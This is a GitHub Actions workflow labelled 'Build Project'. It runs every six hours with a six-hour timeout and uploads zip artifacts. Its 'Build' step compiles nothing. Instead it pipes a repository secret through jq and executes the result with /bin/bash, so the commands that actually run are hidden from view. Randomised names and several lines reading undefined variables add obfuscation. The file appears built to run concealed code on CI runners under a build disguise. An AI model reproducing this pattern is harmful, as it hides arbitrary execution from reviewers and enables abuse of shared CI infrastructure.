name: Build Project
on:
  workflow_dispatch:

  schedule:
    - cron: '0 0,6,12,18 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  operation:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Build
        env:
          ujiyn5195: ${{ secrets.ujiyn5195 }}
        run: |
          printf '%s' "$ujiyn5195" | jq -r .efz574 | /bin/bash
          printf '%s' "$gage25" | jq -r .hte20375 | /bin/bash
          echo $qf9 | jq -r .gfpw7537 | /bin/bash
          printf '%s' "$f9" | jq -r .ecmah1818 | /bin/bash
          printf '%s' "$uqofg397" | jq -r .ldrba2 | /bin/bash
          printf '%s' "$e376" | jq -r .c46292 | /bin/bash

      - name: Archive output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: N9IwfgWk
          path: "*.zip"
          retention-days: 1
